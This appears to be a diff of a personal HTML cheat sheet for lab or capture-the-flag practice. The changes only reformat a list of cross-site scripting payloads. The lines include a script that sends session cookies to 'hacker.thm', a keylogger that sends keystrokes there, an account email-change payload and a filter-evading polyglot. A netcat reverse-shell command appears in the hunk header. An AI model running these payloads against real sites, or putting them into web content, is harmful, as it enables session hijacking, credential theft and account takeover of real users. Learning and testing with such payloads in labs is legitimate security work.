@@ -249,18 +249,21 @@ nc -e /bin/sh 10.20.14 8080<br>
     <h3>Some common XSS payload -</h3>
     <P>
       <b>Proof Of Concept:</b><br>
-      <pre>&lt;script&gt;alert('XSS');&lt;/script&gt; </pre>
+      <ol><pre>&lt;script&gt;alert('XSS');&lt;/script&gt; </pre></ol>
 
-      <b>Session Stealing:</b><br>
-      <pre>&lt;script&gt;fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));&lt;/script&gt;</pre>
+      <b>Session/Cookie Stealing:</b><br>
+      <ol><pre>&lt;script&gt;fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));&lt;/script&gt;</pre></ol>
 
       <b>Key Logger:</b>
-      <pre>&lt;script&gt;document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}&lt;/script&gt;</pre>
+      <ol><pre>&lt;script&gt;document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}&lt;/script&gt;</pre></ol>
 
       <b>Business Logic:</b>
-      <pre>&lt;script&gt;user.changeEmail('attacker@hacker.thm');&lt;/script&gt;</pre>
+      <ol><pre>&lt;script&gt;user.changeEmail('attacker@hacker.thm');&lt;/script&gt;</pre></ol>
       <a href="https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html">XSS Cheat Sheet</a>
-      <pre>jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=alert('THM')//&gt;\x3e</pre>
+      <br><br>
+      <b>Polyglots:</b>
+      <p>Use polyglots to bypass advanced filter.</p>
+      <ol><pre>jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=alert('THM')//&gt;\x3e</pre></ol>
       <p><b>***</b> View source code and try diffrent methon.</p>
     </P>
 </div>
